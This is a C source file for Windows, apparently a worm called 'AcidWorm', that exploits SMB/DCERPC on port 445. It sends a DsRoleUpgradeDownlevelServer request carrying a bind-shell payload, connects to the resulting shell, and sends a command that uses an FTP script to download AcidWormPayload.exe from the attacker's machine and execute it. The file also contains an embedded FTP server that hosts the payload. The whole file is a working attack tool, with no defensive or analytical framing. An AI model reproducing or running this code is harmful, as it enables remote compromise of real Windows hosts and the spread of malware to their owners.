#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define _CRT_SECURE_NO_WARNINGS

#include <WS2tcpip.h>
#include <winsock2.h>
#include <Windows.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")

#include "requests.h"



void SendPacket(int socket, char* buffer, size_t bufferLen, int readResponse = 1);
void SendBindshellCommand(const char* targetIP, int targetPort);
DWORD WINAPI StartFTP(LPVOID lpParameter);
void SendString(int socket, const char* str);


int main()
{
	printf("[*] AcidWorm 2025\r\n");

	const char* localIP = "192.168.1.2";
	int localPort = 242;

	const char* targetIP = "192.168.1.1";
	int targetPort = 445;

	unsigned char recvBuff[500] = { 0 };


	WSADATA wsa;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("[*] WSAStartup failed. \r\n");
		return 0;
	}

	HANDLE thread = CreateThread(NULL, NULL, StartFTP, NULL, NULL, NULL);

	if (thread == INVALID_HANDLE_VALUE)
	{
		printf("[*] Failed to create ftp server thread\r\n");
	}

	int sock = socket(AF_INET, SOCK_STREAM, 0);

	int timeout = 10000; // milliseconds
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));


	struct sockaddr_in targetAddress;
	targetAddress.sin_family = AF_INET;
	targetAddress.sin_port = htons(targetPort);
	inet_pton(AF_INET, targetIP, &targetAddress.sin_addr);


	if (connect(sock, (const sockaddr*)&targetAddress, sizeof(targetAddress)) < 0)
	{
		printf("[*] connect failed. targetIP: %s, port: %i error: %i\r\n", targetIP, targetPort, WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return 1;
	}


	SendPacket(sock, (char*)SMB_NEGOTIATE_REQUEST_PACKET, sizeof(SMB_NEGOTIATE_REQUEST_PACKET));
	SendPacket(sock, (char*)SMB_SETUP_ANDX_REQUEST_1_PACKET, sizeof(SMB_SETUP_ANDX_REQUEST_1_PACKET));
	SendPacket(sock, (char*)SMB_SETUP_ANDX_REQUEST_2_PACKET, sizeof(SMB_SETUP_ANDX_REQUEST_2_PACKET));
	SendPacket(sock, (char*)SMB_CONNECT_ANDX_REQUEST_PACKET, sizeof(SMB_CONNECT_ANDX_REQUEST_PACKET));
	SendPacket(sock, (char*)SMB_NT_CREATE_ANDX_REQUEST_PACKET, sizeof(SMB_NT_CREATE_ANDX_REQUEST_PACKET));
	SendPacket(sock, (char*)DCERPC_BIND_REQUEST_PACKET, sizeof(DCERPC_BIND_REQUEST_PACKET));
	SendPacket(sock, (char*)DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET_BINDSHELL, sizeof(DCERPC_DSSETUP_DSROLEUPGRADEDOWNLEVELSERVER_REQUEST_PACKET_BINDSHELL), 0);

	SendBindshellCommand(targetIP, 2421);

	while (true)
	{
		Sleep(1000);
	}

	system("pause");

	closesocket(sock);
	WSACleanup();
	return 1;
}



void SendPacket(int socket, char* buffer, size_t bufferLen, int readResponse)
{
	int bytesSent = 0;
	int bytesRecieved = 0;
	unsigned char recvBuff[1500] = { 0 };

	bytesSent = send(socket, buffer, bufferLen, 0);
	if (bytesSent <= 0)
	{
		printf("[*] send failed.\r\n");
		printf("recv failed or connection closed: %d\n", WSAGetLastError());
		closesocket(socket);
		return;
	}

	printf("[*] sent %i bytes\r\n", bytesSent);

	if (readResponse)
	{
		bytesRecieved = recv(socket, (char*)recvBuff, sizeof(recvBuff), 0);
		if (bytesRecieved <= 0)
		{
			printf("recv failed or connection closed: %d\n", WSAGetLastError());
			closesocket(socket);
			return;
		}

		//printf("[*] recieved %i bytes\r\n", bytesRecieved);
	}
}

void SendPacketNonBlocking(int socket, char* buffer, size_t bufferLen)
{
	int bytesSent = 0;
	int bytesRecieved = 0;
	unsigned char recvBuff[8500] = { 0 };

	bytesSent = send(socket, buffer, bufferLen, 0);
	if (bytesSent <= 0)
	{
		printf("[*] send failed.\r\n");
		printf("recv failed or connection closed: %d\n", WSAGetLastError());
		closesocket(socket);
		return;
	}

	printf("[*] sent %i bytes\r\n", bytesSent);

	fd_set rfds;
	
	FD_ZERO(&rfds);
	FD_SET(socket, &rfds);

	struct timeval tv = { 0, 0 };  // zero timeout → non-blocking poll

	while (true)
	{
		bytesRecieved = recv(socket, (char*)recvBuff, sizeof(recvBuff), 0);
		if (bytesRecieved <= 0)
		{
			printf("recv failed or connection closed: %d\n", WSAGetLastError());
			closesocket(socket);
			return;
		}

		int ready = select(0, &rfds, NULL, NULL, &tv);

		if (ready <= 0)
			break;
	};
}


void SendBindshellCommand(const char* targetIP, int targetPort)
{
	int sock = socket(AF_INET, SOCK_STREAM, 0);

	int timeout = 10000; // milliseconds
	setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof(timeout));


	struct sockaddr_in targetAddress;
	targetAddress.sin_family = AF_INET;
	targetAddress.sin_port = htons(targetPort);
	inet_pton(AF_INET, targetIP, &targetAddress.sin_addr);


	if (connect(sock, (const sockaddr*)&targetAddress, sizeof(targetAddress)) < 0)
	{
		printf("[*] connect failed. targetIP: %s, port: %i error: %i\r\n", targetIP, targetPort, WSAGetLastError());
		closesocket(sock);
		WSACleanup();
		return;
	}

	SendPacket(sock, (char*)packetBeforeStage, sizeof(packetBeforeStage), 0);
	SendPacketNonBlocking(sock, (char*)bindshellStage, sizeof(bindshellStage));

	
	bool customCommand = false;

	if(customCommand)
	{
		while (true)
		{
			char cmd_buff[256];

			ZeroMemory(cmd_buff, sizeof(cmd_buff));

			printf("Enter command: ");

			fgets(cmd_buff, sizeof(cmd_buff), stdin);

			size_t len = strlen(cmd_buff);

			SendPacketNonBlocking(sock, (char*)cmd_buff, len);
		}
	}
	else
	{

		const char* shit = "\n";

		//This is the command that gets executed on the target host. It retrieves the payload executable via ftp from the attacking machine
		const char* ftpCommand = "echo off&echo open 192.168.1.2 6666>>cmd.ftp&echo AcidWorm>>cmd.ftp&echo passwd>>cmd.ftp&echo bin>>cmd.ftp&echo get AcidWormPayload.exe>>cmd.ftp&echo bye>>cmd.ftp&echo on&ftp -s:cmd.ftp&AcidWormPayload.exe&echo on\n";


		//send a newline 3 times to recieve banners
		for (int i = 0; i < 3; i++)
		{
			SendPacketNonBlocking(sock, (char*)shit, strlen(shit));
		}

		printf("[*] Sent shit\r\n");

		SendPacketNonBlocking(sock, (char*)ftpCommand, strlen(ftpCommand));

		printf("[*] Sent FTP command..\r\n");

	}
}



void SendString(int socket, const char* str)
{

	int len = strlen(str);

	send(socket, str, len, 0);

}



DWORD WINAPI StartFTP(LPVOID lpParameter)
{
	SOCKET listenSock;
	SOCKET clientSock;
	struct sockaddr_in addr, clientAddr;
	socklen_t addrlen = sizeof(clientAddr);
	char recvBuf[1024] = { 0 };
	char fileName[256] = "AcidWormPayload.exe";
	int bytes, n, dataSocket = 0;

	// --- CREATE SOCKETS ---
	listenSock = socket(AF_INET, SOCK_STREAM, 0);
	if (listenSock == INVALID_SOCKET) 
	{
		return 0;
	}

	memset(&addr, 0, sizeof(addr));
	memset(&clientAddr, 0, sizeof(clientAddr));

	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(6666);

	if (bind(listenSock, (struct sockaddr*)&addr, sizeof(addr)) != 0)
	{
		printf("[*] [FTP] bind failed %d\n", WSAGetLastError());
		return 0;
	}

	if (listen(listenSock, 1) != 0)
	{
		printf("[*] [FTP] listen failed %d\n", WSAGetLastError());
		return 0;
	}

	printf("[*] [FTP] Server running on port 6666...\n");

	while (1)
	{
		clientSock = accept(listenSock, (struct sockaddr*)&clientAddr, &addrlen);
		if (clientSock == INVALID_SOCKET)
		{
			printf("[*] [FTP] accept failed %d\n", WSAGetLastError());
			break;
		}

		printf("\t[*] [FTP] Client connected: %s\n", inet_ntoa(clientAddr.sin_addr));

		// --- HANDSHAKE ---
		SendString(clientSock, "220 OK\r\n");
		printf("\t[*] [FTP] SENT: 220 OK\n");


		unsigned char dataSocketPort[2];
		int dataSocketIP[4], port_dec;
		char ip_decimal[40];

		while (1)
		{
			// --- RECEIVE COMMAND ---
			n = 0;
			while (1)
			{
				bytes = recv(clientSock, &recvBuf[n], 1, 0);

				if (bytes <= 0)
					break;

				if (recvBuf[n] == '\n')
				{
					recvBuf[n] = 0;
					break;
				}

				if (recvBuf[n] != '\r') n++;
			}

			if (bytes <= 0)
			{
				printf("\t[*] [FTP] Client disconnected\n");
				break;
			}

			printf("\t[*] [FTP] RECV: %s\n", recvBuf);

			// --- USER ---
			if (!strncmp(recvBuf, "USER", 4))
			{
				SendString(clientSock, "331 OK\r\n");
				printf("\t[*] [FTP] SENT: 331 OK\n");
			}

			// --- PASS ---
			else if (!strncmp(recvBuf, "PASS", 4))
			{
				SendString(clientSock, "230 Logged in\r\n");
				printf("\t[*] [FTP] SENT: 230 Logged in\n");
			}

			// --- RETR ---
			else if (!strncmp(recvBuf, "RETR", 4) || !strncmp(recvBuf, "get", 3))
			{
				
				if (!sscanf(recvBuf, "RETR %255s", fileName))
				{
					printf("\t[*] scanf failed %i", GetLastError());
				}
				printf("\t[*] [FTP] RETR requested: %s\n", fileName);

				FILE* f = fopen(fileName, "rb");
				if (!f)
				{
					SendString(clientSock, "450 File not found\r\n");
					printf("\t[*] [FTP] SENT: 450 File not found\n");
					continue;
				}

				SendString(clientSock, "150 Opening data connection\r\n");
				printf("\t[*] [FTP] SENT: 150 Opening data connection\n");

				char buffer[40000];
				int r;


				while ((r = fread(buffer, 1, sizeof(buffer), f)) > 0)
				{
					if (dataSocket)
					{
						send(dataSocket, buffer, r, 0);
					}
				}

				fclose(f);

				SendString(clientSock, "226 Transfer complete\r\n");
				printf("\t[*] [FTP] SENT: 226 Transfer complete\n");

				closesocket(dataSocket);
				dataSocket = 0;
			}
			// --- BIN ---
			else if (!strncmp(recvBuf, "TYPE", 4))
			{
				printf("\t[*] [FTP] %s\n", recvBuf);
				SendString(clientSock, "200 Type set to I\r\n");
			}
			// --- PORT ---
			else if (!strncmp(recvBuf, "PORT", 4)) 
			{
				
				sscanf(recvBuf, "PORT %d,%d,%d,%d,%d,%d", &dataSocketIP[0], &dataSocketIP[1], &dataSocketIP[2], &dataSocketIP[3], (int*)&dataSocketPort[0], (int*)&dataSocketPort[1]);
				sprintf(ip_decimal, "%d.%d.%d.%d", dataSocketIP[0], dataSocketIP[1], dataSocketIP[2], dataSocketIP[3]);
				port_dec = dataSocketPort[0] * 256 + dataSocketPort[1];

				SendString(clientSock, "200 PORT command successful\r\n");

				// close old data socket if open
				if (dataSocket != 0 && dataSocket != INVALID_SOCKET)
				{
					closesocket(dataSocket);
				}

				// create a new data socket
				dataSocket = socket(AF_INET, SOCK_STREAM, 0);

				struct sockaddr_in dataAddr;

				memset(&dataAddr, 0, sizeof(dataAddr));

				dataAddr.sin_family = AF_INET;
				dataAddr.sin_port = htons(port_dec);
				dataAddr.sin_addr.s_addr = inet_addr(ip_decimal);


				if (connect(dataSocket, (struct sockaddr*)&dataAddr, sizeof(dataAddr)) != 0)
				{
					SendString(clientSock, "425 Can't open data connection\r\n");
					closesocket(dataSocket);
					dataSocket = 0;
				}
			}
			// --- QUIT ---
			else if (!strncmp(recvBuf, "QUIT", 4))
			{
				SendString(clientSock, "221 Bye\r\n");
				printf("\t[*] [FTP] SENT: 221 Bye\n");

				closesocket(clientSock);
				break;
			}

			// --- UNKNOWN ---
			else
			{
				SendString(clientSock, "500 Unknown command\r\n");
				printf("\t[*] [FTP] SENT: 500 Unknown command\n");
			}
		}
	}

	closesocket(listenSock);
	ExitThread(0);
}



